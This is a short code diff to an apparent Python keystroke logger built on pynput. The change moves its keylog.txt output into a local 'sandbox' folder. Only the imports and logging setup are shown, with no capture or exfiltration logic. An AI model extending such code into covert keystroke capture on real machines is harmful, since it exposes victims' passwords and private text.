@@ -1,6 +1,10 @@
 from datetime import datetime, timedelta  
 from pynput.keyboard import Key, Listener
+from pathlib import Path
 import logging
+
+BOX = Path(__file__).resolve().parent / "sandbox"
+BOX.mkdir(exist_ok=True)                      # ensure sandbox/ exists
 
 # ---------- Configure logging ----------
 # Set up a basic log file called keylog.txt inside the current working directory.
@@ -10,7 +14,7 @@ import logging
 #       - %(asctime)s  → human-readable timestamp
 #       - %(message)s  → whatever text we pass to logging.info()
 logging.basicConfig(
-    filename=("keylog.txt"), 
+    filename=str(BOX / "keylog.txt"), 
     level =logging.DEBUG, 
     format = "%(asctime)s - %(message)s"
 )
